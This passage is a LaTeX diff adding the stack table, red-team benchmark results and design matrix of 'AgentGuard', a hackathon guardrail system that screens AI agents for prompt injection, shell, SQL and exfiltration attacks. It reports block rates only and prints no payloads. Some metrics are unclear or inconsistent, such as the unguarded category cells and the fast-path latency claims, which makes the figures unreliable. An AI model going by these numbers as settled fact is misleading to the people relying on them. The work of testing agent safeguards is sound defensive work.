+\renewcommand{\arraystretch}{1.15}
+\noindent
+{\small
+\begin{tabularx}{\textwidth}{l l l X}
+\toprule
+\textbf{Layer / Concern} & \textbf{Technology}
+  & \textbf{Version} & \textbf{Deployment} \\
+\midrule
+Language \& packaging
+  & Python 3.11+ $\cdot$ uv
+  & 3.11 min & In-process \\
+L1 --- injection detect
+  & Azure AI Content Safety (Prompt Shields)
+  & GA & Azure Cloud \\
+L1 --- fast path
+  & 33-pattern offline regex blocklist
+  & Custom & In-process, $<$1\,ms \\
+L2 --- PII redaction
+  & Azure AI Language
+  & GA & Azure Cloud \\
+L2 --- toxicity
+  & Azure AI Content Safety
+  & GA & Azure Cloud \\
+L2 --- groundedness
+  & LLM-as-judge (OpenAI SDK $\to$ TrueFoundry)
+  & Custom & In-process, 1--3\,s \\
+L3/L4 --- firewall + RBAC
+  & Pure Python, zero external deps
+  & Custom & In-process \\
+LLM gateway
+  & TrueFoundry (OpenAI-compatible)
+  & Any & Cloud / self-hosted \\
+Observability --- live
+  & OpenTelemetry $\to$ Jaeger
+  & OTEL 1.x & Sidecar / cloud \\
+Observability --- audit
+  & SQLite (tamper-evident)
+  & Built-in & Local file \\
+Red-team --- prompts
+  & Promptfoo (npx)
+  & CLI & Dev / CI \\
+Red-team --- OWASP
+  & DeepTeam
+  & Top 10 & Dev / CI \\
+Dashboard API
+  & FastAPI
+  & 0.111+ & Containerised \\
+Dashboard hosting
+  & \url{https://agentguard.exempl4r.xyz/}
+  & Live & Cloud PaaS \\
+Performance cache
+  & Redis (config-stubbed)
+  & Roadmap & Azure Cache \\
+\bottomrule
+\end{tabularx}
+}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 9 — Benchmark & Metrics Summary
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{9}\; Benchmark \& Metrics Summary}
+\label{sec:benchmark}
+\vspace{-2mm}
+{\small\itshape Adversarial test results across two independent runs}
+
+\vspace{6mm}
+
+% KPI boxes
+\begin{center}
+\begin{tikzpicture}[
+  kpi/.style={draw=medgray, rounded corners=6pt, fill=white,
+              minimum width=3.5cm, minimum height=2.4cm,
+              align=center, inner sep=6pt, line width=0.8pt,
+              drop shadow={shadow xshift=1pt, shadow yshift=-1pt,
+                           opacity=0.15}},
+]
+\node[kpi] (k1) at (0,0) {%
+  {\huge\bfseries\textcolor{passgreen}{95--97.5\%}}\\[4pt]
+  {\small Attack Block Rate}\\[-1pt]
+  {\tiny (guarded vs unguarded)}
+};
+\node[kpi] (k2) at (4.8,0) {%
+  {\huge\bfseries\textcolor{blockred}{96\%}}\\[4pt]
+  {\small CRITICAL Block Rate}\\[-1pt]
+  {\tiny adversarial suite}
+};
+\node[kpi] (k3) at (9.6,0) {%
+  {\huge\bfseries\textcolor{accentcyan}{0.65\,s}}\\[4pt]
+  {\small Avg Block Latency}\\[-1pt]
+  {\tiny offline tier, no API call}
+};
+\node[kpi] (k4) at (14.4,0) {%
+  {\huge\bfseries\textcolor{accentorange}{410}}\\[4pt]
+  {\small Unit Tests}\\[-1pt]
+  {\tiny 0 failures}
+};
+\end{tikzpicture}
+\end{center}
+
+\vspace{8mm}
+
+\renewcommand{\arraystretch}{1.2}
+\noindent
+\begin{tabularx}{\textwidth}{l l c c c X}
+\toprule
+\textbf{Run} & \textbf{Agent} & \textbf{Tests}
+  & \textbf{Secure\,\%} & \textbf{Improvement} & \textbf{Notes} \\
+\midrule
+Run 1    & GuardedBot     & 40  & 97.5\,\% & ---       & \\
+Run 1    & Unguarded      & 40  & 47.5\,\% & +50.0\,pp
+  & Guarded vs unguarded \\
+Run 2    & GuardedBot     & 40  & 95.0\,\% & ---       & \\
+Run 2    & Unguarded      & 40  & 7.5\,\%  & +87.5\,pp
+  & Worst-case baseline \\
+Combined & CRITICAL       & --- & 96\,\% blocked & ---
+  & Adversarial suite \\
+Fast path & Offline 0/1   & --- & 0.65\,s avg & ---
+  & No Azure API needed \\
+\bottomrule
+\end{tabularx}
+
+\vspace{4mm}
+
+\noindent\textbf{Test toolchain:} Promptfoo (25+ adversarial scenarios,
+npx runner) + DeepTeam (OWASP Agentic Top 10).
+All 410 unit tests pass with 0 failures.
+
+\vspace{6mm}
+
+\noindent\textbf{Category breakdown (Run 2 --- worst case):}
+
+\vspace{3mm}
+\noindent
+\begin{tabularx}{\textwidth}{l c c c}
+\toprule
+\textbf{Category} & \textbf{Tests} & \textbf{Guarded}
+  & \textbf{Unguarded} \\
+\midrule
+Prompt Injection       & 6 & 6/6 (100\%) & 6/6 (100\%) \\
+SQL Attack             & 5 & 4/5 (80\%)  & 5/5 (100\%) \\
+File System            & 5 & 5/5 (100\%) & 5/5 (100\%) \\
+Network Exfiltration   & 5 & 5/5 (100\%) & 5/5 (100\%) \\
+Shell Attack           & 5 & 5/5 (100\%) & 5/5 (100\%) \\
+Privilege Escalation   & 4 & 4/4 (100\%) & 3/4 (75\%)  \\
+PII Exfiltration       & 3 & 2/3 (67\%)  & 2/3 (67\%)  \\
+Multi-Vector           & 3 & 3/3 (100\%) & 2/3 (67\%)  \\
+Supply Chain           & 2 & 2/2 (100\%) & 2/2 (100\%) \\
+\bottomrule
+\end{tabularx}
+
+\vspace{4mm}
+
+\noindent\textbf{Severity block rate (combined):}
+CRITICAL 96\% $\cdot$ HIGH 93--100\% $\cdot$ MEDIUM 100\%
+
+\vspace{4mm}
+
+\noindent\textbf{Latency profile:}
+
+\vspace{3mm}
+\noindent
+\begin{tabularx}{\textwidth}{X c}
+\toprule
+\textbf{Metric} & \textbf{Value} \\
+\midrule
+Fast-path block (offline regex / blocklist)
+  & 0.65\,s avg \\
+Azure-backed block (Prompt Shields + Content Safety)
+  & 3.10\,s avg \\
+Fastest single block recorded
+  & 0.41\,s \\
+\bottomrule
+\end{tabularx}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 10 — Design Decisions Matrix
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{10}\; Design Decisions Matrix}
+\label{sec:decisions}
+\vspace{-2mm}
+{\small\itshape Key architectural choices, rationale, and explicit trade-offs}
+
+\vspace{6mm}
+
+\renewcommand{\arraystretch}{1.35}
+\noindent
+{\small
+\begin{longtable}{%
+  >{\bfseries\color{accentorange}\raggedright}p{2.5cm}
+  >{\raggedright}p{2.8cm}
+  >{\raggedright}p{5cm}
+  >{\raggedright\arraybackslash}p{4.5cm}}
+\toprule
+\textbf{Decision} & \textbf{Choice Made} & \textbf{Rationale}
+  & \textbf{Trade-off / Deferred Alt.} \\
+\midrule
+\endfirsthead
+\toprule
+\textbf{Decision} & \textbf{Choice Made} & \textbf{Rationale}
+  & \textbf{Trade-off / Deferred Alt.} \\
+\midrule
+\endhead
+
+L2 provider &
+  Azure AI Language + Content Safety &
+  Single trust boundary with L1; avoids second external model dependency &
+  Guardrails AI deferred as optional future plugin \\
+\addlinespace
+
+Tiered L1 (offline first) &
+  Tier 0/1 regex before Azure API call &
+  $\sim$40--60\,\% blocked free at $<$1\,ms;
+  Azure only for ambiguous inputs &
+  Regex misses novel patterns $\to$ Tier 2 catches those \\
+\addlinespace
+
+ABAC ELEVATE outcome &
+  3rd outcome: ELEVATE $\to$ HITL queue &
+  Binary ALLOW/DENY blocks valid edge-cases;
+  ELEVATE routes to human without dropping the task &
+  Adds async complexity; requires HITL UI / webhook \\
+\addlinespace
+
+C2 MELON opt-in &
+  Disabled by default; enabled in YAML &
+  Requires 2 LLM calls (2$\times$ cost); only justified for
+  medical/financial/legal agents &
+  Always-on = 2$\times$ cost; config flag is the balance \\
+\addlinespace
+
+Dual observability (OTel + SQLite) &
+  OTel for live SRE; SQLite for forensics &
+  OTel spans are ephemeral; compliance audits need local record
+  independent of cloud connectivity &
+  Two writes per event; acceptable overhead \\
+\addlinespace
+
+Redis caching &
+  Config-stubbed (not wired yet) &
+  Architecture validated; wiring deferred to avoid prototype
+  complexity &
+  Hot path is $\sim$200\,ms instead of target $<$50\,ms \\
+\addlinespace
+
+Spotlighting &
+  Azure AI Foundry endpoint required &
+  Best-in-class indirect injection defence for
+  document-grounded agents &
+  Not available in prototype; falls back to Tier-1 regex \\
+\addlinespace
+
+AutoGen adapter &
+  Dependency installed; adapter not written &
+  AutoGen/Magentic-One as primary target framework;
+  adapter is straightforward given decorator pattern &
+  Next-step item with mentorship \\
+
+\bottomrule
+\end{longtable}
+}
+
+\vspace{1.5cm}
+
+\begin{center}
+\begin{tikzpicture}
+  \draw[accentorange, line width=2pt] (-4,0) -- (4,0);
+\end{tikzpicture}
+
+\vspace{8mm}
+
+{\sffamily\large\bfseries AgentGuard}
+
+\vspace{3mm}
+
+{\sffamily\small
+AI Unlocked 2026 $\cdot$ Track 5: Trustworthy AI $\cdot$
+IIT Kharagpur --- Team NamoFans}
+
+\vspace{3mm}
+
+{\sffamily\small Live demo:
+\url{https://agentguard.exempl4r.xyz/}}
+\end{center}
+
+\end{document}
